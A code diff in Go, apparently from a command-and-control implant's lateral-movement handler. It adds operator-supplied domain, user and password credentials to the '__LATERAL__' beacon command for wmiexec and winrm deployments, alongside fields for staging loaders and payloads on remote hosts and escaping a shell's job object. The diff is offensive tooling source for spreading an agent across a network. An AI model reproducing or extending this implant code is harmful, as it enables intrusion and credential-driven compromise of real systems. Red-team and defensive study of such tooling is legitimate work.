@@ -26,18 +26,30 @@ var embeddedLateralService []byte
 
 // lateralPayload carries the lateral movement request as a JSON body on the
 // __LATERAL__ beacon command, mirroring __MAKE_TOKEN__.
+// lateralIdentity carries operator-supplied credentials that force the
+// network identity of one lateral deployment. It travels like make_token
+// credentials: JSON body fields in memory, never logged and never echoed in
+// error text. Explicit credentials take precedence over the ambient
+// make_token token for the wmiexec and winrm methods.
+type lateralIdentity struct {
+	Domain   string `json:"domain"`
+	User     string `json:"user"`
+	Password string `json:"password"`
+}
+
 type lateralPayload struct {
-	Method         string  `json:"method"`
-	Host           string  `json:"host"`
-	SessionID      string  `json:"session_id"`
-	WorkspaceID    *string `json:"workspace_id,omitempty"`
-	RemoteName     string  `json:"remote_name"`
-	Stage          string  `json:"stage"`
-	Loader         string  `json:"loader,omitempty"`
-	PayloadSHA256  string  `json:"payload_sha256,omitempty"`
-	TimeoutSeconds float64 `json:"timeout_seconds"`
-	HTTPS          bool    `json:"https,omitempty"`
-	Insecure       bool    `json:"insecure,omitempty"`
+	Method         string           `json:"method"`
+	Host           string           `json:"host"`
+	SessionID      string           `json:"session_id"`
+	WorkspaceID    *string          `json:"workspace_id,omitempty"`
+	RemoteName     string           `json:"remote_name"`
+	Stage          string           `json:"stage"`
+	Loader         string           `json:"loader,omitempty"`
+	PayloadSHA256  string           `json:"payload_sha256,omitempty"`
+	TimeoutSeconds float64          `json:"timeout_seconds"`
+	HTTPS          bool             `json:"https,omitempty"`
+	Insecure       bool             `json:"insecure,omitempty"`
+	Identity       *lateralIdentity `json:"identity,omitempty"`
 	winrmIdentity  *winrmCredentials
 	// loaderDeploy marks the server-sourced deployment chain: the agent
 	// artifact bytes come from the staging endpoint instead of this
@@ -322,6 +334,26 @@ func parseLateralPayload(command string) (lateralPayload, error) {
 	// receiver re-stages through local WMI to escape the shell's job object.
 	if payload.independentLifetime && (payload.Method != "winrm" || !payload.loaderDeploy) {
 		return payload, errors.New("independent lifetime requires a winrm loader deployment")
+	}
+	if payload.Identity != nil {
+		// Explicit credentials are wired into the wmiexec and winrm
+		// methods only; psexec keeps its ambient SCM/SMB staging.
+		if payload.Method != "wmiexec" && payload.Method != "winrm" {
+			return payload, errors.New("identity requires the wmiexec or winrm method")
+		}
+		payload.Identity.Domain = strings.TrimSpace(payload.Identity.Domain)
+		payload.Identity.User = strings.TrimSpace(payload.Identity.User)
+		if payload.Identity.User == "" {
+			return payload, errors.New("identity user is required")
+		}
+		if payload.Identity.Domain == "" && strings.Contains(payload.Identity.User, `\`) {
+			payload.Identity.Domain, payload.Identity.User, _ = strings.Cut(payload.Identity.User, `\`)
+			payload.Identity.Domain = strings.TrimSpace(payload.Identity.Domain)
+			payload.Identity.User = strings.TrimSpace(payload.Identity.User)
+			if payload.Identity.User == "" {
+				return payload, errors.New("identity user is required")
+			}
+		}
 	}
 	if !lateralRemoteNamePattern.MatchString(payload.RemoteName) {
 		return payload, errors.New("remote_name must be a simple .exe filename")
